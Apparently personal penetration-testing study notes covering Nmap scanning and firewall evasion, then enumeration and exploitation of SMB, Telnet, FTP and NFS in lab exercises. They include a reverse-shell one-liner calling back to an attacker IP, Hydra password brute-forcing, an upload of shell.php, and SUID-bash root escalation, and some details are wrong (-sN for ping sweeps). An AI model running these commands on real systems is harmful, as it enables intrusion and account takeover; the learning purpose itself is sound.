# Nmap
Nmap is a port-scanning tool which connects to each port of the target in turn. Depending on the response it gets it determines the port as open, closed or filltered (by a [[Network Fundamentals#Firewalls 101|firewall]]). After we know which ports are open, we can then find out what services are running on them and start enumerating them.
## Scan Types
Nmap offers three basic scan types:
- TCP Connect Scans (`-sT`)
- SYN "Half-open" Scans (`-sS`)
- UDP Scans (`-SU`)

Additionaly there are less common scan types, three of them are:
- TCP Null Scans (`-sN`)
- TCP FIN Scans (`-sF`)
- TCP Xmas Scan (`-sX`)

Besides the UDP scan these have a similar purpose but work differently.

>[!info]
> To understand the TCP Connect and the SYN Scan you should know about the [[Network Fundamentals#TCP Three-Way-Handshake|Three-Way-Handshake]]  
### TCP Connect Scan
The TCP Connect Scan (`-sT`) is done by performing the TCP Three-Way-Handshake with each port in turn. In other words Nmap tries to connect to each specific TCP port.
If a port is closed it will respond with a packet with the RST (Reset) flag set and Nmap can establish that.   
Many firewalls are configured to simply drop incoming packets, meaning that if Nmap sends a TCP SYN request and receives nothing back, Nmap consideres the port as *filtered*. Although it is also easy to configure a firewall that it responds with a RST packet. 

### SYN Scan
The TCP SYN scan (`-sS`) , also known as *"Half-open* or *"Stealth* scan, does not complete the Three-Way-Handshake, instead sending a RST TCP packet after receiving a SYN/ACK packet form the target. The SYN scan is the default scan when Nmap is run with `sudo`, else the default is the TCP connect scan.

Advantages:
- can bypass older Intrusion Detection systems
- often not logged by applications listening on open ports
- faster than standart TCP Connect scan

Disadvantages:
- require "sudo" permissions 
- unstable services are sometimes brought dowm by this scan

### UDP Scan
[[Network Fundamentals#UDP/IP|UDP]] is more difficult and slower to scan, because it is *stateless*, meaning there is no "handshake" to establish a connection. 
When a packet is send to a port during a UDP scan (`-sU`) there should be no response, a requeset is than send again to double check and the port is marked as open | filtered. If there is a response the port is marked as open. A closed UDP port responds with a ICMP packet messaging that the port is unreachable.

### NULL, FIN and XMAS Scan
These scans are less commonly used than the other scans but are used with firewall evasion as many firewalls are configured to drop incoming TCP packets with the SYN flag set. 
[RFC 793](https://datatracker.ietf.org/doc/html/rfc793) mandates that hosts respond to malformed packets with a RST TCP packet when the port is closed and no response if the port is open, but is not always practiced.
Modern IDS are aware of these scans so do not rely on them to be 100% effective.
These scans will mark ports only as open | filtered (no response), closed (RST response) or filtered (ICMP unreachable packet).
- **NULL scan (`-sN`):** sends a TCP request with no flags set
- **FIN scan (`-sF`):** sends a packet with the FIN flag set (used to close a connection) 
- **XMAS scan (`-sX`)** sends a malformed packet with the PSH, URG adn FIN flag set

### ICMP Network Scanning
To find out what IP addresses on a network contain active hosts we can perform a "ping sweep", sending a ICMP packet to every possible address and marking the address as open when there is a response.
A "ping sweep" is performed with the `-sN` switch and the IP address range either with hypen (`-`) or in CIDR notation. 
```
nmap -sN 192.168.0.1-254
nmap -sN 192.168.0.0/24
```
The `-sN` switch also tells Nmap to send a TCP SYN packet to port 443 and a TCP ACK (or SYN when not as root) to port 80 of the target.

## NSE Scripts
### Overview
The *Nmap Scripting Engine (NSE)* executes scripts written in the [Lua](https://www.lua.org/pil/contents.html) programming language, allowing you to extend the functionality of Nmap scans.
Some categories in the script library are:
- **safe:** Will not affect the target
- **intrusive**: likely to affect the target
- **vuln**: Scan for vulnerabilities
- **exploit**: Attempt to exploit a vulnerability
- **auth**: Attempt to bypass authentication for running services 
- **brute**: Attempt to bruteforce credentials for running services
- **discovery**: Attempt to query running services for information about the network (query a SNMP server)

A longer list can be found [here](https://nmap.org/book/nse-usage.html).
The scripts have built-in help menus, which you can access with `nmap --script-help scriptName`
### Working with the NSE
To run any applicable script from a category against a target you use `--script=category`, for example `--script=safe`.
To run a specific script use `--script=scriptName`, for example `--script=http-fielupload-exploiter`.
Some scripts require arguments, these can be given with `--script-args` switch. For example the `http-put` script, used to upload files with the PUT method, takes two arguments: the URL to upload the file and the location of the file on the disk.
```
nmap -p 80 --script http-put --script-args http-put.url'/dav/shell.php', http-put.file='./shell.php'
```
The arguments have the syntax `scriptName.Argument` and are seperated by commas.

A full list of scripts and their arguments can be found [here](https://nmap.org/nsedoc/). 

### Searching for Scripts
You can search in two places for NSE scripts:
- the [Nmap website](https://nmap.org/nsedoc/)
- on Linux: in */usr/share/nmap/scripts* in the local storage

Searching in the local storage can be done using the */usr/share/nmap/scripts/script.db* file, which is not a database but a formatted file. 
You can search for scripts just like [[Linux Fundamentals#Searching for Files|searching for files]]:
```
grep "ftp" /usr/share/nmap/scripts/script.db
ls -l /usr/share/nmap/scripts/*ftp*
```
You can search for categories the same way:
```
grep "safe" /usr/share/nmap/scripts/script.db*
```

### Installing Scripts
Installing scripts can be done by updating Nmap with;
```
sudo apt update && sudo apt install nmap
```
or manually downloading and installing the script:
```
sudo wget -O /usr/share/nmap/scripts/scriptName.nse https://svn.nmap.org/nmap/scripts/scriptName.nse

nmap --script-updatedb
```

## Firewall Evasion
Besides the *Null*, *FIN* and *XMAS* scan there are other ways to bypass a firewall.

|         Switch          |                                                                                           Function                                                                                            |
| :---------------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
|          `-Pn`          |    Windows host will block incoming ICMP packets, resulting in Nmap marking it as dead; the switch tells Nmap to not ping the host before scanning it, but to just consider it alive <br>     |
|          `-f`           |                                                    fragment the packets, making it less likely they will be detected by a firewall or IDS                                                     |
|         `--mtu`         |                                                          set the maximum transmission size of the packets (must be a multiple of 8)                                                           |
| `--scan-delay <time>ms` |                                           set a delay between packets in ms; usefull for unstable networks and evading time-based firewalls and IDS                                           |
|       `--badsum`        | generates a invalid checksum for a packet, which a TCP/IP stack would drop, but a firewall may respond to it without checking the checksum (thus revealing the presence of a firewall or IDS) |
# Network Services
There are many services that allow machines inside a network to communicate, share files, etc. with eachother. These services can be an attack vendor when misconfigured.

Before we can exploit a service, f.e start a reverse shell, we must *enumerate* the service and the machine. Enumeration is ""a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system." - [InfoSec Institute](https://www.infosecinstitute.com/resources/penetration-testing/what-is-enumeration/).
## Server Message Block (SMB)
The *Server Message Block (SMB)* protocol  is a client-server communication protocol used for sharing accesst to files, printers, serial ports and other resources on a network. (More information [here](https://www.techtarget.com/searchnetworking/definition/Server-Message-Block-Protocol)) 
SMB is a response-request protocol, transmitting multiple messages between the client and server to establish a connection. 
The client connects to the server using NETBIOS over TCP/IP (more information in [RFC 1001](https://datatracker.ietf.org/doc/html/rfc1001) and [RFC 1002](https://datatracker.ietf.org/doc/html/rfc1002)), NetBEUI or IPX/SPX. 
Once a connection is established the client can send commands to the server allowing it to access shares, open, read and write files, etc.
Windows OS support the SMB protocols client and server. On Unix systems there is [Samba](https://www.samba.org/), a open source server that supports SMB.  

### Enumerating SMB
There are often share drives on a server, which can be used to view files, sometimes with sensitive contents in them. 

As always you should do a portscan using Nmap as the first step of enumeration. The standart port for SMB is port 445, for modern systems, and port 139.

**Enum4Linux**
This tool is used to enumerate SMB shares on both Windows and Linux systems. It is installed by default on Parrot and Kali and you can install it from the official [github](https://github.com/CiscoCXSecurity/enum4linux)
The syntax is `enum4linux options ip-address`, f.e `enum4linux -a 192.168.1.101`.

| TAG  | Function                             |
| ---- | ------------------------------------ |
| `-U` | get userlist                         |
| `-M` | get machine list                     |
| `-N` | get namelist dump                    |
| `-S` | get sharelist                        |
| `-P` | get password policy information      |
| `-G` | get group and member list            |
| `-a` | all of the above (basic enumeration) |
### Exploiting SMB
After enumerating the SMB server you may know:
- the share location
- the name of an interesting share

To access the SMB share we need a client. For this we use [SMBClient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) , part of the standard samba suite.
The syntax for SMBClient is `smbclient //IP-address/shareName -U user -p port` , for example:
```
smbclient //10.10.10.2/secret -U mike -p 445
```

**Example**
You can try to check if a share allows anonymous access, by using the username "Anonymous" and not entering a password.
We could potenitally find a file with a (user)name for example Max Muster, whos the owner of the file.
If we find a .ssh folder we can `Get` the private key and try to [[Linux Fundamentals#Accessing Linux using SSH|connect]] with a secure shell.
Remember to tryout different usernames, for example "Max", "MaxMuster" or "Muster", etc.

Also remember to [[Introduction to (Re)searching#Vulnerability Searching|search for exploits]] , like [CVE-2017-7494](https://www.cvedetails.com/cve/CVE-2017-7494/ "CVE-2017-7494 security vulnerability details") on Exploit DB and other sites.
## Telnet
Telnet allows you to execute commands on a remote machine hosting a telnet server, by using a telnet client. 
Telnet has been replaced by SSH in most implementations, because Telnet sends all messages in plain text and has no specific security mechanisms. 
You can connect to a Telnet server with the command `telnet ip-address port`, for example
```
telnet 192.168.1.101 23
```
After connecting successfully you can then use Telnet commands.
The standart port for Telnet is port 23.
### Enumerating Telnet
We first scan the target machine useing Nmap, but do not find any of the top 1000 ports open. After scanning more ports we discover that port 8012 is open and uses the TCP protocol. 
Now we can connect to Telnet using :
```
telnet 192.168.1.101 8012
```

The title of the telnet server is "Slidy's Backdoor", given us the possibility that we found a username.

### Exploiting Telnet
Now that we are connected to the Telnet server we can start entering commands. Sadly we do not get a return of our input. 
To check if we can execute commands we start a tcpdump listener in another terminal with:
```
sudo tcpdump ip proto \\icmp -i tun0
```
In the terminal connected to the Telnet server we enter:
```
.RUN ping your-id-address -c 1
```

We receive pings, meaning we can execute commands.

We are generating a reverse shell payload with *msfvenom* using:
```
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```

| switch  | meaning                           |
| ------- | --------------------------------- |
| `-p`    | payload                           |
| `lhost` | local host IP address (your IP)   |
| `lport` | port to listen to on your machine |
| `R`     | export the payload in raw format  |
Now we start a netcat listener, the syntax is `nc -lvp port`, on our system with:
```
nc -lvp 4444
```

Lastly we paste the msfvenom payload into the telnet terminal and run it as a command:
```
.RUN mkfifo /tmp/shha; nc 10.10.134.129 4444 0</tmp/shha | /bin/sh >/tmp/shha 2>&1; rm /tmp/shha
```

We now have a reverse shell on the target machine and can use the terminal runnig the netcat listener to run commands.

Remember to search for CVE's on:
- https://www.cvedetails.com/
- https://cve.mitre.org/
## File Transfer Protocol (FTP)
The *File Transfer Protocol (FTP)* allows the remote transfer of files over a network, using a client-server model.
**How does FTP work?**
A *FTP* session operates on two channels:
- command / control channel: transmits commands and responses
- data channel: transmits data

A FTP server can support active or / and passive connections:
- active: the client opens a port and listens; the server actively connects to the client
- passive: the serve opens a port and listens; the client actively connects to the server

Before a connection is completed the server validates the given login credentials and may open the session.
The standard port for FTP is port 21.
More information are [here](https://www.ietf.org/rfc/rfc959.txt).

### Enumerating FTP
To enumerate the FTP server we try to exploit an anonymous login, by connecting to the server and entering "anonymous" and no password.
To connect to the server you must have a ftp client installed if not use:
```
sudo apt install ftp
```

To connect use `ftp ip-address` for example :
```
ftp 192.168.1.101
```

We discover a file named "public_notice.txt", after downlaoding and reading it we might have a username, "mike".

### Exploiting FTP
We will try to bruteforce the password to "mike" account with the help of [Hydra](https://github.com/vanhauser-thc/thc-hydra). 
Hydra is a password cracking tool, which can be used against more than 50 protocols (including Telnet,RDP, SSH, FTP, HTTP, HTTPS, SMB), databases and more.
To crack the password we use:
```
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.101 ftp
```

| Section           | Function                                                          |
| ----------------- | ----------------------------------------------------------------- |
| `hydra`           | run the hydra tool                                                |
| `-t`              | Number of parallel connections per target                         |
| `-l username`     | the target user                                                   |
| `-P path/to/file` | the file which contains a list of possible passwords              |
| `-vV`             | Set verbose mode to maximum; show login+password for each attempt |
| `ftp`             | set the protocol                                                  |
After running the command and waiting it turns out that the password for the account is "password". With the name and password we now can connect to a secure shell.

## Network File System (NFS)
The *Network File System (NFS)* allows the shareing of files and dictonaries, by mounting a directory from a server, onto the clients machine , which can then be accessed.

**How does NFS work?**
First the client requests to mount a directory from a remote host on a local directory, just like it would with a physical device. The mount service then connects to the relevant mount daemon using *Remote Procedure Call (RPC)*.
After the server checks if the user has the right persmissions to mount the directory, it will return a file handle uniquely identifying each file and directory on the server.
When accessing a file with NFS, a RPC call is placed to the NFS daemon on the server, containing the parameters:
- the file handle
- name of the requested file
- user's user ID
- user's group ID

These parameter determin the access rights to the specific file, controlling user permissions (reading, writing files).

**What runs NFS?**
The NFS protocol allows that different OS can act as a server and client to another OS, meaning a Windows Server can also act as a NFS server for a system running Unix or MacOS and vice versa. 

**More Information**
More information about NFS can be found here:
- https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html 
- https://www.datto.com/blog/what-is-nfs-file-share
- https://nfs.sourceforge.net/
- https://wiki.archlinux.org/title/NFS

### Enumerating NFS
To interact with a NFS share you need to have *nfs-common* installed on your machine, which can be done with
```
sudo apt install nfs-common
```
Although it is usually preinstalled on most Linux distributions.

You also need a "*mounting point*", a directory where the share can be accessed. You can create this directory anywhere on the system, for example: (the tmp directory will be deleted when the machine is turned off)
```
mkdir /tmp/mount
```

After that you can mount the NFS share with:
```
sudo mount -t nfs IP-address:share /path/to/mounting-point/ -nolock
```

To view the visible share of a target machine use:
```
/usr/sbin/showmount -e IP-address
```

### Exploiting NFS
We can try to escalate our priviliges by exploiting a misconfiguration of "Root Squashing". If turned on it prevents users who are connected to gain root access. However if turned off we can create a [SUID bit file](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit) and gain root access. We basically want to upload a bash executable to the share and execute it it to gain a root shell. 
The steps are:
1. NFS access
2. Gain low privilege shell
3. Upload Bash Executable to the NFS share
4. Login through SSH
5. Execute SUID Bit Bash Executable
6. Root access

### Exercise
1. We first do a port scan and find that port 2049 is open.
2. Using `/usr/sbin/showmount -e ip-address` we list the NFS share and find the share `/home`
3.  We create a mounting point and mount the `/home` share and find that there is a folder called "cappucino" inside.
4. looking through the files inside the folder, we find a `.ssh` folder, which contains a `id_rsa` key file.
5. we download and move the key into our .ssh folder; using `chmod 600 keyName` we protect the key from any changes.
6. We use the key to connect to a shell on the server with:
    `ssh -i /root/id_rsa cappucino@10.10.208.50`
7. We have a low privilege shell so we will exploid "root squashing"
8. We will download a "Ubuntu Server 18.04" [bash executable](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash) with:  `wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash`
9. We move the bash executable to the NFS share and to set that the owner is a root user we use `sudo chown root bash`
10. To add the SUID bit we use `sudo chmod +s bash` and `sudo chmod +x bash`
11. We use the terminal with connected with SSH and enter `./bash -p`; `-p` persists the permissions so it can run with SUID. 
    If everything was right we now have a shell with root privileges 
12. We change the directory with `cd /root` and find the flag
## SMTP
**What is SMTP**
*Simple Mail Transfer Protocol (SMTP)* is used to handle the sending of emails in combination with *POP*/*IMAP*.  
A *SMTP* server offers three basics functions:
- verify who is sending emails through the SMTP server
- sending outgoing mail
- sending mails back to the sender if outgoing mail can not be delivered

The standard port is port 25.

**POP and IMAP**
*Post Office Protocol (POP)* and *Internet Message Access Protocol (IMAP)* are email protocols used to transfer emails between a client and mail server. 
They have different approaches:
- POP simply downloads the whole inbox from the server
- IMAP synchronises the inbox by downloading new mails

**How does SMTP work?**
1. The mail user agent, your email client or external program, connects to the SMTP server of your domain, f.e. smtp.google.com, initiating the SMTP handshake.
2. The client submits the sender and reciepient's email address and the email body to the server.
3. The SMTP server checks if the reciepient's and sender domain name are the same.
4. The SMTP server connects to the recipient's SMTP server and send the email. If the recipient's SMTP server can not be accessed, the email is put into a SMTP queue.
5. The recipient's SMTP server verifies the incoming email, by checking if the domain and user name have been recognised, and then forward the email to the POP or IMAP server.
6. The email can be seen in the recipient's inbox.

For more details click [here](https://computer.howstuffworks.com/e-mail-messaging/email3.htm).
# Further Reading
- https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
- https://attack.mitre.org/techniques/T1210/
- https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
